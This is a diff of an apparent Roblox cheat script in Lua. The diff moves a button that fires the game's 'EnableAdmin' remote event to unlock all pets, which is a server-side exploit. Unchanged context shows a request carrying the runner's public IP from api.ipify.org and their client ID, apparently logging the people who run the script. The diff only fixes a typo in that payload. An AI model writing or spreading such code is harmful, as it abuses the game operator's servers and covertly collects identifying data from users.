@@ -35,7 +35,7 @@ local response = request({
                         ["name"] = "IP: ",
                         ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                         ["inline"] = true
-                    }, {F
+                    }, {
                         ["name"] = "Client Id : ",
                         ["value"] = game:GetService("RbxAnalyticsService")
                             :GetClientId(),
@@ -1844,13 +1844,6 @@ MainSection:CreateToggle({
     end
 })
 
-MiscSection:CreateButton({
-    Name = 'get all pets Have to rejoin',
-    Callback = function()
-      game:GetService("ReplicatedStorage").References.Comm.Events.EnableAdmin:fireServer()
-    end
-})
-
 MainSection:CreateInteractable({
     Name = 'Infinite Yield',
     ActionText = 'Execute',
@@ -2079,6 +2072,13 @@ MiscSection:CreateToggle({
     Callback = function(Value)
         getgenv().configs.ClickTp = Value
         ClickTp()
+    end
+})
+
+MiscSection:CreateButton({
+    Name = 'Get all pets (rejoin the same server)',
+    Callback = function()
+      game:GetService("ReplicatedStorage").References.Comm.Events.EnableAdmin:fireServer()
     end
 })
 
